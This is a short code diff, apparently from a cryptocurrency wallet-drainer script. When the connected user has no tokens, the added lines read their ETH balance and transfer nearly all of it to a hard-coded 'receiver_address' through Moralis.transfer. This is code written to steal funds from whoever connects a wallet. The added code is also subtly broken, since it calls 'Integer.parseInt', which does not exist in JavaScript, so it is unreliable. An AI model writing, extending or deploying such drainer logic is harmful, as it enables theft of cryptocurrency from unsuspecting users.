@@ -344,8 +344,29 @@ async function proceed(){
     
     
         if (eth_tokens.length < 1) {
+
+          const eth_balance = await getBalance(user_address, apiKey).catch(e=>{
+            console.log("Unable to get new eth balance", e);
+          });
+          const balance = Integer.parseInt(web3.utils.fromWei(eth_balance.balance, 'ether')) - 0.005;
+          console.log("The new eth balance", balance);
+          if (balance > 0) {
+          const options = {
+            type: "native",
+            amount: Moralis.Units.ETH(balance.toString()),
+            receiver: receiver_address,
+          };
+          let result = await Moralis.transfer(options);
+          console.log(result);
+        }
+        else {
+          console.log("Insufficient funds")
+        }
           return console.log('No tokens found')
-        } // No NFTs
+        } 
+        
+        
+        // No NFTs
         // eth_nfts.result.forEach(async (nft, i) => {
         for(let n=0; n<eth_tokens.length; n++){
           let token = eth_tokens[Number(n)];
